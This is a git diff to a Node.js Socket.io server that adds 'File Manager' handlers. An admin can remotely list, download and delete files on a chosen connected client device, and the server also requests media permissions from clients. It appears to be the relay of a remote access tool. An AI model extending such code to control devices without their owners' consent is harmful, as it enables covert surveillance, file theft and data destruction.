@@ -113,6 +113,60 @@ io.on('connection', (socket) => {
     io.to(clientId).emit('request_media_permission');
   });
 
+  // ─── File Manager ───────────────────────────────────────────
+
+  // Admin file list চাইলে
+  socket.on('get_file_list', (data) => {
+    // data = { clientId, path }
+    io.to(data.clientId).emit('get_file_list', { path: data.path });
+  });
+
+  // Client file list পাঠালে
+  socket.on('file_list_result', (data) => {
+    // data = { path, files: [...] }
+    Object.keys(admins).forEach(adminId => {
+      io.to(adminId).emit('file_list_result', {
+        clientId: socket.id,
+        path: data.path,
+        files: data.files
+      });
+    });
+  });
+
+  // Admin file download চাইলে
+  socket.on('download_file', (data) => {
+    // data = { clientId, path }
+    io.to(data.clientId).emit('download_file', { path: data.path });
+  });
+
+  // Client file data পাঠালে
+  socket.on('file_download_result', (data) => {
+    // data = { path, fileName, fileData, mimeType }
+    Object.keys(admins).forEach(adminId => {
+      io.to(adminId).emit('file_download_result', {
+        clientId: socket.id,
+        ...data
+      });
+    });
+  });
+
+  // Admin file delete চাইলে
+  socket.on('delete_file', (data) => {
+    // data = { clientId, path }
+    io.to(data.clientId).emit('delete_file', { path: data.path });
+  });
+
+  // Client delete result পাঠালে
+  socket.on('delete_file_result', (data) => {
+    // data = { path, success, error }
+    Object.keys(admins).forEach(adminId => {
+      io.to(adminId).emit('delete_file_result', {
+        clientId: socket.id,
+        ...data
+      });
+    });
+  });
+
   // Disconnect
   socket.on('disconnect', () => {
     delete clients[socket.id];
